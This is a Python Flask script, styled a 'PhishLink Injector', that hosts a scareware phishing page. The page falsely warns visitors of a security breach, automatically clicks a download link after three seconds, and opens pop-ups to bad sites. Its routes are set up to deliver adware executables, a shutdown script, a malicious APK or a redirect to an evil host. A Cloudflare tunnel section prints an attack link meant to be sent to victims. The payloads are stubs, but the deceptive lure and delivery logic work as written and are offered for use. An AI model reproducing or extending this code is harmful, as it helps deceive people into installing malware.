```python
import os
from flask import Flask, render_template_string, redirect, url_for
import random
import time

# --- Configuration ---
APP_SECRET = os.environ.get('SECRET_KEY', 'your_strong_secret_key_here')
# Path to where you might store logs or configuration
PAYLOAD_DIR = 'payloads' 

# --- Initialize App ---
app = Flask(__name__)
app.secret_key = APP_SECRET

# ======================================================================
# MALWARE PAYLOADS (SIMULATED)
# In a real scenario, these URLs point to the actual malicious files (.exe, .apk, .zip)
# ======================================================================
MALWARE_OPTIONS = {
    "PC_ADWARE": "/download/adware_injector.exe",
    "PC_CRASH": "/download/shutdown_trigger.bat",
    "MOBILE_APK": "/download/malicious_app.apk",
    "BROWSER_HIJACK": "/redirect/hijacker_page"
}

# --- HTML Template for the Attack Landing Page (The Hook) ---
# This is a highly aggressive HTML/JS setup designed to maximize clicks/downloads
HTML_CONTENT = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 Urgent Security Alert: Your System Needs Fixing! 🔥</title>
    <style>
        body { font-family: 'Arial', sans-serif; background-color: #1a0000; color: #fff; text-align: center; padding: 20px; }
        .container { background: #330000; border: 5px solid #ff0000; padding: 30px; border-radius: 15px; max-width: 600px; margin: 50px auto; box-shadow: 0 0 20px rgba(255, 0, 0, 0.8); }
        h1 { color: #ff4444; font-size: 2.5em; margin-bottom: 15px; }
        p { font-size: 1.2em; line-height: 1.6; }
        .cta-button { display: inline-block; background-color: #00cc00; color: white; padding: 15px 30px; margin-top: 25px; text-decoration: none; border-radius: 10px; font-size: 1.4em; transition: background-color 0.3s; border: 3px solid #00aa00; }
        .cta-button:hover { background-color: #009900; transform: scale(1.05); }
        .urgent { color: yellow; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚨 URGENT SECURITY BREACH DETECTED! 🚨</h1>
        <p>Dear User, our scanners found multiple critical vulnerabilities on your device. Immediate action is required to prevent data loss and system failure.</p>
        <p class="urgent">Click the button below to instantly scan, update, and secure your system against viral threats!</p>

        <!-- Placeholder for the dynamically generated link/button -->
        <a id="malwareLink" href="{{ generated_url }}" class="cta-button">
            🛡️ SECURE MY SYSTEM NOW! 🛡️
        </a>

        <p style="margin-top: 20px; font-size: 0.8em;">(Clicking immediately initiates the system cleaning/upgrade process.)</p>
    </div>

    <script>
        // -----------------------------------------------------------------
        // !!! INJECTION SCRIPT FOR AUTOMATIC TRIGGERING !!!
        // This JS tries to automate the click or force redirects/downloads.
        // -----------------------------------------------------------------
        document.addEventListener('DOMContentLoaded', function() {
            var linkElement = document.getElementById('malwareLink');
            var targetUrl = "{{ generated_url }}";

            // 1. Automatic Click Trigger (Best for immediate action)
            setTimeout(function() {
                console.log("Automated click trigger initiated.");
                linkElement.click();
            }, 3000); // Wait 3 seconds before automatically clicking

            // 2. Advanced: Tab Sniping/Pop-up on load (if not already active)
            window.onload = function() {
                console.log("Window load detected. Forcing pop-ups...");
                // Open secondary tabs for aggressive advertising or payload delivery
                window.open('https://badsite1.com', 'AdWindow1');
                window.open('https://badsite2.com', 'AdWindow2');
            }
        });
    </script>
</body>
</html>
"""


@app.route('/')
def index():
    """Main page serving the attack hook."""
    # Determine which attack vector to favor (for testing purposes)
    attack_choice = random.choice(list(MALWARE_OPTIONS.keys()))

    # Get the associated URL path
    target_url = MALWARE_OPTIONS[attack_choice]

    # Render the content, passing the final attack URL to the HTML
    return render_template_string(
        HTML_CONTENT, 
        generated_url=url_for('trigger_payload', payload_type=attack_choice)
    )

@app.route('/trigger/<payload_type>')
def trigger_payload(payload_type):
    """This route acts as the specific delivery point for the chosen malware."""

    # --- CORE MALWARE DELIVERY LOGIC HERE ---

    if payload_type == "PC_ADWARE":
        # For PC/Laptop, serve the executable or a forced download link
        # In a real scenario, this endpoint would stream the EXE file.
        return f"Download Initiated: {os.path.basename(MALWARE_OPTIONS['PC_ADWARE'])}.exe. (This would stream the malware!)"

    elif payload_type == "PC_CRASH":
        # For PC/Laptop, simulate the crash
        return "Payload Active: Initiating forced shutdown sequence script..."

    elif payload_type == "MOBILE_APK":
        # For Mobile, serve the APK
        return "Download Initiated: Malicious App APK. (This is the viral package!)"

    elif payload_type == "BROWSER_HIJACK":
        # For Browser Hijack, redirect to another malicious page
        return redirect("https://evil-redirect-destination.com")

    else:
        return "Error: Unknown payload type."


# ======================================================================
# CLOUDFLARED LINK GENERATION SIMULATION (Main execution point)
# ======================================================================
def generate_cloudflare_link():
    """
    Simulates the link generation process required for Cloudflare Tunnel.
    In a real deployment, this function would call the cloudflared CLI 
    or interact with the CF API.
    """
    print("\n" + "="*50)
    print("       ✨ CLOUDFLARED LINK GENERATION MODULE ✨")
    print("="*50)

    # Assume your tunnel is pointed to the local app:
    LOCAL_HOST = "localhost:5000" 

    # *** IMPORTANT ***
    # You MUST replace this placeholder with the actual domain/subdomain you configured in cloudflared
    CF_DOMAIN = "your-subdomain.yourdomain.com" 

    print(f"[INFO] Target Local Service: {LOCAL_HOST}")
    print(f"[INFO] Target Cloudflare Domain: {CF_DOMAIN}")

    # The link that is sent to the victim
    final_link = f"https://{CF_DOMAIN}/" 

    print("\n" + "*"*60)
    print(f"✅ SUCCESS: Generated Final Attack Link for Victim:")
    print(f"   >> {final_link}")
    print("*"*60 + "\n")

    return final_link


if __name__ == '__main__':
    print("--- PhishLink Injector Initializing ---")

    # 1. Generate the link first (This is what you share)
    attack_link = generate_cloudflare_link()

    # 2. Run the web server (This is what hosts the attack)
    print("\n" + "#"*50)
    print("🔥 RUNNING WEB SERVER 🔥")
    print("Access locally at: http://127.0.0.1:5000")
    print("Press CTRL+C to stop the server.")
    print("#"*50)

    # Run the application. Since you are using Cloudflare Tunnel, 
    # this port (5000) is what tunnel forwards to.
    app.run(debug=True, port=5000, threaded=True)
